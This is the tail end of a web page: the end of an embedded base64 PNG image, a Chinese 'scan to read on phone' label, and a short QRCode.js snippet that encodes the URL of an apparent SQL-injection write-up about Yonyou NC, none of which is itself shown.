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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 